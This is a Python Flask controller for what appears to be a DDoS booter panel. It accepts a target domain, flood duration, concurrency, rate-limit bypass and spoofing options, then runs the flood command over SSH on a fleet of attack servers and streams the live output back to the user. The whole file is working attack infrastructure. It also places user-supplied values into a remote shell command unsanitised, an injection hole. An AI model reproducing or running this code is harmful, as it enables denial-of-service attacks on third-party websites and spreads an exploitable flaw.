from flask import jsonify, request, current_app
from app.extensions import socketio
from app.models.attack_log import AttackLog
from app.db import db
import paramiko
import threading
import json
from app.configs.blacklist import BLACKLISTED_DOMAINS, MAX_ATTACK_ATTEMPTS
from app.models.user import User
from app.configs.whitelist import WHITELISTED_IPS
from app.configs.servers import ATTACK_SERVERS
from app.models.attack_server_log import AttackServerLog

class AttackController:
    # Add class variable to store active channels
    active_channels = {}  # Format: {attackLogId: {serverHostname: channel}}

    def _streamOutput(self, channel, socketId, attackLogId, serverHostname, app):
        with app.app_context():
            fullOutput = ""
            serverLog = AttackServerLog(
                attackLogId=attackLogId,
                serverHostname=serverHostname,
                status='running'
            )
            db.session.add(serverLog)
            db.session.commit()

            while True:
                if channel.recv_ready():
                    output = channel.recv(4096).decode()
                    fullOutput += output
                    socketio.emit('log_message', {
                        'data': output,
                        'server': serverHostname
                    }, room=socketId)
                if channel.recv_stderr_ready():
                    errorOutput = channel.recv_stderr(4096).decode()
                    fullOutput += f"ERROR: {errorOutput}"
                    socketio.emit('log_message', {
                        'data': f"ERROR: {errorOutput}",
                        'server': serverHostname
                    }, room=socketId)
                if channel.exit_status_ready():
                    # Remove channel from active channels when complete
                    if attackLogId in self.active_channels and serverHostname in self.active_channels[attackLogId]:
                        del self.active_channels[attackLogId][serverHostname]
                        if not self.active_channels[attackLogId]:
                            del self.active_channels[attackLogId]
                    # Update server log with final output
                    serverLog.output = fullOutput
                    serverLog.status = 'completed'
                    db.session.commit()

                    # Check if all server logs are completed
                    allServerLogs = AttackServerLog.query.filter_by(attackLogId=attackLogId).all()
                    if all(log.status == 'completed' for log in allServerLogs):
                        attackLog = AttackLog.query.get(attackLogId)
                        if attackLog:
                            attackLog.status = 'completed'
                            db.session.commit()
                    break

    def _executeRemoteCommand(self, hostName, userName, passWord, command, socketId, attackLogId):
        try:
            sshClient = paramiko.SSHClient()
            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            sshClient.connect(hostName, username=userName, password=passWord)
            
            transport = sshClient.get_transport()
            channel = transport.open_session()
            channel.get_pty()
            channel.exec_command(command)

            # Store channel reference
            if attackLogId not in self.active_channels:
                self.active_channels[attackLogId] = {}
            self.active_channels[attackLogId][hostName] = channel

            app = current_app._get_current_object()
            streamThread = threading.Thread(
                target=self._streamOutput, 
                args=(channel, socketId, attackLogId, hostName, app)
            )
            streamThread.daemon = True
            streamThread.start()
            
            return True, None
        except Exception as e:
            # Update server log status on error
            serverLog = AttackServerLog(
                attackLogId=attackLogId,
                serverHostname=hostName,
                status='failed',
                output=str(e)
            )
            db.session.add(serverLog)
            db.session.commit()
            return False, str(e)

    def _executeOnServers(self, attackCommand, socketId, attackLogId, serverList=None):
        if not serverList:
            serverList = ATTACK_SERVERS

        successfulServers = []
        errors = []

        for server in serverList:
            # Generate command using server-specific node path
            command = f"xvfb-run {server['nodePath']} {attackCommand}"
            
            success, error = self._executeRemoteCommand(
                server['hostName'],
                server['userName'],
                server['password'],
                command,
                socketId,
                attackLogId
            )
            
            if success:
                successfulServers.append(server['hostName'])
            else:
                errors.append(f"Server {server['hostName']}: {error}")

        return successfulServers, errors

    def attack(self):
        # Check if client IP is whitelisted
        clientIp = request.remote_addr
        if clientIp not in WHITELISTED_IPS:
            return jsonify({
                "status": "error",
                "message": "Access denied: Your IP is not whitelisted"
            }), 400

        currentUser = request.currentUser
        data = request.get_json()
        
        # Check if user is active and hasn't exceeded max attempts
        user = User.query.get(currentUser['id'])
        if not user.status:
            return jsonify({
                "status": "error",
                "message": "Your account has been deactivated"
            }), 400

        # Check for MAX_ATTACK_ATTEMPTS before proceeding
        if user.attackCount >= MAX_ATTACK_ATTEMPTS:
            user.deactivate()
            return jsonify({
                "status": "error",
                "message": f"You have exceeded the maximum number of attacks ({MAX_ATTACK_ATTEMPTS}). Your account has been deactivated"
            }), 400

        socketId = data.get('sid', '')
        domainName = data.get('domain')
        attackTimeValue = data.get('attack_time')
        bypassRateLimitValue = str(data.get('bypass_ratelimit')).lower()
        coreStrengthValue = data.get('core_strength')
        modeValue = data.get('mode')
        concurrentValue = data.get('concurrents')
        requestCount = data.get('request')
        spoofCount = data.get('spoof')
        typeAttack = data.get('typeAttack')
        
        # Check blacklisted domains
        for blacklisted in BLACKLISTED_DOMAINS:
            if blacklisted in domainName.lower():
                # Increment attack count first
                user.increment_attack_count()

                return jsonify({
                    "status": "error",
                    "message": f"Your attack on {domainName} has been blocked"
                }), 400

        # Get headers from request headers
        headers = dict(request.headers)
        # Remove default headers we don't want to store
        headers.pop('Host', None)
        headers.pop('Content-Length', None)
        headers.pop('Content-Type', None)
        headers.pop('User-Agent', None)
        headers.pop('Accept', None)
        headers.pop('Accept-Encoding', None)
        headers.pop('Connection', None)
        headers.pop('Authorization', None)

        if not domainName:
            return jsonify({
                "status": "error",
                "message": "Domain is required"
            }), 400

        # Get target servers from request
        data = request.get_json()
        targetServers = data.get('servers', None)
        
        # Filter servers if specific ones are requested
        selectedServers = None
        if targetServers:
            selectedServers = [
                server for server in ATTACK_SERVERS 
                if server['hostName'] in targetServers
            ]
            if not selectedServers:
                return jsonify({
                    "status": "error",
                    "message": "No valid servers found in the request"
                }), 400 

        if spoofCount is not None:
            attackCommand = f"{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --auth true --ratelimit {bypassRateLimitValue} --spoof {str(data.get('spoof')).lower()}"
        else:
            attackCommand = f"{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --auth true --ratelimit {bypassRateLimitValue}"

        print(attackCommand)
            
        # Create attack log entryJ
        attackLog = AttackLog(
            userId=currentUser['id'],
            domainName=domainName,
            time=int(attackTimeValue),
            concurrent=int(concurrentValue),
            request=int(requestCount),
            command=attackCommand,
            headers=json.dumps(headers) if headers else None
        )
        print(attackCommand)
        db.session.add(attackLog)
        db.session.commit()

        # Execute command on all specified servers with parameters instead of command
        successfulServers, errors = self._executeOnServers(
            attackCommand,
            socketId,
            attackLog.id,
            selectedServers
        )

        if not successfulServers:
            return jsonify({
                "status": "error",
                "message": f"Attack failed on all servers. Errors: {', '.join(errors)}"
            }), 500

        return jsonify({
            "status": "success",
            "message": "Attack started. Check websocket for live logs.",
            "attackLogId": attackLog.id,
            "successfulServers": successfulServers,
            "errors": errors if errors else None
        })

    def terminate_attack(self, logId: int):
        currentUser = request.currentUser
        attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not attackLog:
            return jsonify({
                "status": "error",
                "message": "Attack log not found"
            }), 404

        if logId not in self.active_channels:
            return jsonify({
                "status": "error",
                "message": "No active channels found for this attack"
            }), 404

        terminated_servers = []
        for serverHostname, channel in self.active_channels[logId].items():
            try:
                channel.close()
                serverLog = AttackServerLog.query.filter_by(
                    attackLogId=logId,
                    serverHostname=serverHostname
                ).first()
                if serverLog:
                    serverLog.status = 'terminated'
                    db.session.commit()
                terminated_servers.append(serverHostname)
            except Exception as e:
                current_app.logger.error(f"Error terminating channel for server {serverHostname}: {str(e)}")

        # Update attack log status
        attackLog.status = 'terminated'
        db.session.commit()

        # Clean up active_channels
        del self.active_channels[logId]

        return jsonify({
            "status": "success",
            "message": "Attack terminated successfully",
            "terminatedServers": terminated_servers
        }), 200

    def terminate_server_attack(self, logId: int, serverHostname: str):
        currentUser = request.currentUser
        attackLog = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not attackLog:
            return jsonify({
                "status": "error",
                "message": "Attack log not found"
            }), 404

        if logId not in self.active_channels or serverHostname not in self.active_channels[logId]:
            return jsonify({
                "status": "error",
                "message": f"No active channel found for server {serverHostname}"
            }), 404

        try:
            # Close the specific channel
            channel = self.active_channels[logId][serverHostname]
            channel.close()

            # Update server log status
            serverLog = AttackServerLog.query.filter_by(
                attackLogId=logId,
                serverHostname=serverHostname
            ).first()
            if serverLog:
                serverLog.status = 'terminated'
                db.session.commit()

            # Remove channel from active_channels
            del self.active_channels[logId][serverHostname]
            if not self.active_channels[logId]:
                del self.active_channels[logId]
                # If no more active channels, update attack log status
                attackLog.status = 'terminated'
                db.session.commit()

            return jsonify({
                "status": "success",
                "message": f"Attack terminated successfully for server {serverHostname}"
            }), 200

        except Exception as e:
            current_app.logger.error(f"Error terminating channel for server {serverHostname}: {str(e)}")
            return jsonify({
                "status": "error",
                "message": f"Error terminating channel: {str(e)}"
            }), 500

    def getLogs(self):
        currentUser = request.currentUser
        limit = int(request.args.get('limit', 10))
        page = int(request.args.get('page', 1))
        skip = (page - 1) * limit

        # Modified query to include server logs
        query = AttackLog.query.filter_by(userId=currentUser['id'])
        logs = query.order_by(AttackLog.createdAt.desc()).limit(limit).offset(skip).all()
        total = query.count()

        # Fetch server logs for each attack log
        logsWithServerData = []
        for log in logs:
            logDict = log.toDict()
            serverLogs = AttackServerLog.query.filter_by(attackLogId=log.id).all()
            logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]
            logsWithServerData.append(logDict)

        return jsonify({
            'data': logsWithServerData,
            'meta': {
                'total': total,
                'totalPages': -(-total // limit),
                'currentPage': page,
                'pageSize': limit
            }
        }), 200

    def getLog(self, logId: int):
        currentUser = request.currentUser
        log = AttackLog.query.filter_by(id=logId, userId=currentUser['id']).first()
        
        if not log:
            return jsonify({
                "status": "error",
                "message": "Log not found"
            }), 404

        # Include server logs in the response
        serverLogs = AttackServerLog.query.filter_by(attackLogId=logId).all()
        logDict = log.toDict()
        logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]

        return jsonify({
            "status": "success",
            "data": logDict
        }), 200